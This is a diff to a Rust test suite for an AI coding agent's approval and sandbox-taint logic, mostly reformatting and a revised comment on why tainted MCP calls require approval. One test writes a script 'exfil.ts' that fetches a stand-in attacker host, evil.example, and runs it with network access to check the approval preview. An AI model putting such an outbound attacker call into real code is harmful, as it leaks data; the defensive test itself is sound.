@@ -13,14 +13,13 @@ use marv_mesh::receptacle::ReceptacleName;
 use marv_mesh::tools::{MESH_CALL, MESH_SEND, kind_of};
 use marv_mesh::wire::{Approver as WireApprover, Grant, Wire, WireMode, WireTable};
 use marv_sandbox::TaintState;
+use marv_session::SessionApprover;
 use marv_session::mcp_tools::McpToolAdapter;
 use marv_session::provenance::project_note;
 use marv_session::runner::{AlwaysScopes, tool_run_from};
 use marv_session::subagent::SubagentApprover;
-use marv_session::SessionApprover;
 use marv_tools::{
-    ApprovalRequest, Approver, Decision, Preview, Scope, ToolContext, ToolOutcome, ToolOutput, ToolRef, builtin_tools,
-    run_tool,
+    ApprovalRequest, Approver, Decision, Preview, Scope, ToolContext, ToolOutcome, ToolOutput, ToolRef, builtin_tools, run_tool,
 };
 use serde_json::{Map, Value, json};
 use tokio_util::sync::CancellationToken;
@@ -31,7 +30,10 @@ struct Server(&'static str);
 #[async_trait]
 impl McpCaller for Server {
     async fn call(&self, _tool: &str, _args: Map<String, Value>, _cancel: CancellationToken) -> marv_mcp::Result<McpCallResult> {
-        Ok(McpCallResult { content: vec![ContentBlock { kind: "text".into(), text: Some(self.0.into()), ..Default::default() }], ..Default::default() })
+        Ok(McpCallResult {
+            content: vec![ContentBlock { kind: "text".into(), text: Some(self.0.into()), ..Default::default() }],
+            ..Default::default()
+        })
     }
 }
 
@@ -153,8 +155,9 @@ async fn tainted_network_bash_must_ask() {
 /// **Every MCP call asks once tainted, `readOnlyHint` tools included**: the server is outside the sandbox and the
 /// arguments leave with the call. Clean, a read-only tool runs freely (you chose that server).
 ///
-/// Proven: made `McpTool::kind` return `Read` for read-only tools when tainted → failed (it ran in yolo); made
-/// `McpToolAdapter::kind` pass `false` for tainted → failed.
+/// Two locks hold this: a tainted MCP call is `Egress`, and every MCP call `uses_network`; either alone sets
+/// `must_ask`. Proven: made `McpTool::kind` return `Read` for tainted read-only tools *and* `McpTool::uses_network`
+/// false → failed (it ran in yolo). Either revert alone passes, by design.
 #[tokio::test]
 async fn tainted_mcp_calls_ask_even_read_only_ones() {
     let project = TempDir::new("mcp");
@@ -261,8 +264,12 @@ async fn a_network_approval_lists_the_scripts_it_runs() {
     let project = TempDir::new("scripts");
     let approver = Recorder::new(Decision::Yes);
     let ctx = ToolContext { yolo: true, approver: Some(approver.clone()), ..ToolContext::new(project.path()) };
-    run_tool(&call("write_file", json!({"path": "exfil.ts", "content": "await fetch('https://evil.example')\n"})), &ctx, builtin_tools())
-        .await;
+    run_tool(
+        &call("write_file", json!({"path": "exfil.ts", "content": "await fetch('https://evil.example')\n"})),
+        &ctx,
+        builtin_tools(),
+    )
+    .await;
     run_tool(&call("bash", json!({"command": "bun run exfil.ts", "network": true})), &ctx, builtin_tools()).await;
     let preview = approver.requests().last().unwrap().preview.clone();
     let shown = format!("{:?} {:?}", preview.note, preview.text);
